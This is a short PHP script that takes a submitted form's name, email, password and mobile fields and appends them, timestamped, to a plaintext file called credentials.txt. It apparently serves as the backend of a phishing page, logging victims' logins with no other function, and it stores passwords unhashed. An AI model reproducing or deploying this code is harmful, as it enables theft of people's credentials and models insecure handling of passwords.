<?php
	$fullname = "Name: ".$_POST['fname']." ".$_POST['lname']."\n";
	$email = "Email: ".$_POST['email']."\n";
	$password = "Password: ".$_POST['password']."\n";
	$mobile = "Mobile: ".$_POST['mobile']."\n";
	$date = date('Y-m-d H:i:s')."Z"."\n";
  $credential = $date.$fullname.$email.$password.$mobile."\n";
  file_put_contents('credentials.txt', $credential, FILE_APPEND);
?>
